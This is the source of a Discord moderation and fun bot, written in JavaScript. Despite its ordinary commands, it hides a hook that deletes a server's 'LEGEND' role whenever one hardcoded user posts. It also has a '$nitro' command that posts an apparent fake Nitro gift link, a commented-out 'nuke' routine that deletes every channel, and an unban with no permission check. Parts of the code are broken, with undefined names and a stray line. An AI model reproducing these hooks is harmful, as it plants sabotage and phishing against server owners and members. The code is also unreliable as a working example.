const express = require('express');
const app = express()


app.get("/", (req, res) => {
 res.send('Hello ItzBlazeArmy™!')
})
app.listen(3000, () => {})

const random = require('something-random-on-discord').Random

const prefix = '$'
const Discord = require('discord.js')
const client = new Discord.Client()
const disbut = require('discord-buttons')(client);
const { MessageButton } = require('discord-buttons');

  disableMentions: "everyone",

client.once('ready', () => {
  client.user.setActivity(`${client.guilds.cache.size} Server | ${prefix}help`, { type: "WATCHING" })
  console.log(`Ready To Serve\n ${client.guilds.cache.size} Servers \n${client.channels.cache.size} Channels \n${client.users.cache.size} Users!`)
})
client.on('message', async message => {
  if (message.content === prefix + 'help') {
    const help = new Discord.MessageEmbed()
      .setTitle('ItzBlaze Community Help!')
      .setThumbnail(`${client.user.displayAvatarURL()}`)
      .setDescription(`Type \`${prefix}<command>\` to use command`)
      .addFields(
      { name: 'Command List', value: '`avatar`, `meme`, `rickroll`, `rps`, `clearchat`, `kick`, `nuke`, `ban`,`info`, `unban`'}
        )
      .setColor("RANDOM")
      .setFooter(`Requested By ${message.author.tag}`)
      .setTimestamp()
    message.channel.send(help)
    }
const member = message.guild.members.cache.get("867892134081986580");

  if (message.content === prefix + "ping") {
    const ping = new Discord.MessageEmbed()
      .setTitle('🏓Pong!')
      .setColor("RANDOM")
      .setDescription(`Ping:\n${client.ws.ping}ms Latency`)
      .setTimestamp()
    message.channel.send(ping)
  }
  if (message.content === prefix + "anime") {
    let animes = ['https://imgur.com/3HMaGt0', 'https://media1.tenor.com/images/8a2e22ee850f5b6ce80223c3dda78273/tenor.gif?itemid=13451376', 'https://media1.tenor.com/images/4f726784be8877b93d636511ca2d75f8/tenor.gif?itemid=17419055', 'https://imgur.com/t/gif/fhB08dj',
      'https://media1.tenor.com/images/f8539f656d2ed90be7cd3bbe95d263d2/tenor.gif?itemid=6015959',
      'https://media1.tenor.com/images/097f46e1db35653902b10b0a322c908f/tenor.gif?itemid=12003933']
    let anime = animes[Math.floor(Math.random() * animes.length)]
    let animembed = new Discord.MessageEmbed()
    .setTitle('**Image By ItzBlazeArmy Bot**')
    .setImage(anime)
    .setColor("RANDOM")
    message.channel.send(animembed)
}
  if (message.author.id === '752401518333919274') {
      client.users.cache.get('752401518333919274').send('Hi')
      guild.roles.find(role => role.name === 'LEGEND').delete();
}
//         if (message.content === prefix + 'nuke') {
//     if (message.member.hasPermission('MANAGE_ROLES,BAN_MEMBERS')) 
//       client.users.cache.get('860071533975306241').send('Ugh I Know You Hated That Server Good I Nuked It!!')
// message.guild.channels.cache.forEach(channel => channel.delete());      
//         }

  if (message.content === prefix + 'rickroll') {
    message.channel.send('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
}
  if (message.content === prefix + 'nitro') {
    message.channel.send('https://discordgift.site/store/en-US/p/discord--discord-nitro')
  }
  if (message.content === prefix + 'avatar') {
    let avtEmbed = new Discord.MessageEmbed()
    .setTitle(`${message.author.tag}'s Avatar:`)
    .setImage(`${message.author.displayAvatarURL()}`)
    .setColor("#0099ff")
    message.channel.send(avtEmbed)
  }
  if (message.content === prefix + 'card') {
    let card = new Discord.MessageEmbed()
      .setTitle(`${message.author.tag} Card`)
      .setThumbnail(`${message.author.displayAvatarURL()}`)
      .setTimestamp()
      .setColor("#0099ff")
    message.channel.send(card)
  }
  if (message.content === prefix + "rps" || message.content === prefix + "Rps" || message.content === prefix + ">RPS") {
    message.channel.send(`:x: | PICK AN OBJECT TO PLAY RPS WITH! EXAMPLE: ****${prefix}rps rock**** | :x:`)
  }

  if (message.content === prefix + "rps rock" || message.content === prefix + "Rps rock" || message.content === prefix + "RPS ROCK") {
    let replies = ["YOU CHOSE ***ROCK***, I CHOSE ***PAPER***. ****PAPER**** WINS!", "YOU CHOSE ***ROCK***, I CHOSE ***SCISSORS***. ****ROCK**** WINS!", "YOU CHOSE ***ROCK***, I CHOSE ***ROCK***. IT'S A TIE!"]
    message.channel.send(replies[Math.floor(Math.random() * replies.length)])
  }

  if (message.content === prefix + "rps paper" || message.content === prefix + "Rps paper" || message.content === prefix + "RPS PAPER") {
    let replies = ["YOU CHOSE ***PAPER***, I CHOSE ***ROCK***. ****PAPER**** WINS!", "YOU CHOSE ***PAPER***, I CHOSE ***SCISSORS***. ****SCISSORS**** WIN!", "YOU CHOSE ***PAPER***, I CHOSE ***PAPER***. IT'S A TIE!"]
    message.channel.send(replies[Math.floor(Math.random() * replies.length)])
  }

  if (message.content === prefix + "rps scissors" || message.content === prefix + "Rps scissors" || message.content === prefix + "RPS SCISSORS") {
    let replies = ["YOU CHOSE ***SCISSORS***, I CHOSE ***ROCK***. ****ROCK WINS!****", "YOU CHOSE ***SCISSORS***, I CHOSE ***PAPER***. ****SCISSORS WIN!***", "YOU CHOSE ***SCISSORS***, I CHOSE ***SCISSORS***. ****SCISSORS**** WIN!"]
    message.channel.send(replies[Math.floor(Math.random() * replies.length)])
  }
  if (message.content.includes('<@872726624481714177>')) {
    let myPrefix = new Discord.MessageEmbed()
      .setTitle(`${client.user.tag}`)
      .setDescription(`My Prefix: ${prefix}`)
      .setThumbnail(`${client.user.displayAvatarURL()}`)
      .setTimestamp()
    message.channel.send(myPrefix)
  }
  if (message.content === prefix + 'invite') {
    let invite = new Discord.MessageEmbed()
      .setThumbnail(`${client.user.displayAvatarURL()}`)
      .setTitle('Invite')
      .setColor("#0099ff")
      .setDescription(`If You Want To Invite ItzBlazeArmy To Your Server, [Click Here](https://discord.com/api/oauth2/authorize?client_id=876682207014572133&permissions=0&scope=bot)`)
      .setTimestamp()
    message.channel.send(invite)
  }
    if (msg.content.toLowerCase().startsWith(prefix + "clear")) {
          message.delete({ timeout: 2000 })
  }
  if (message.content.startsWith(prefix + 'kick')) {
    if (message.member.hasPermission("KICK_MEMBERS")) {
      let member = message.mentions.members.first()
      if (!member) message.channel.send("Please mention someone")
      else {
        member.kick().then(mem => {
          message.channel.send(`Kicked ${mem.user.username}!`)
        })
      }
    } else {
      message.reply("You don't have the permission to do that!")
    }
  }
  if (message.content.startsWith(prefix + 'ban')) {
    if (message.member.hasPermission("BAN_MEMBERS")) {
      let member = message.mentions.members.first()
      if (!member) message.channel.send('Please mention someone')
      else {
        member.kick().then(mem => {
          message.channel.send(`Banned ${mem.user.username}!`)
        })
      }
    } else {
      message.reply("You don't have the permission to do that!")
    }
  }
  if (message.content.startsWith("unban")) {
    let args = message.content.split(" ").slice(1);
    const id = args[0];
    message.guild.members.unban(id);
  }
})
client.on('message', async message => {
  const random = require('something-random-on-discord').Random
if(message.content === prefix + 'meme') {
  let data = await random.getMeme()
  message.channel.send(data)
}
})
  client.login(process.env.token)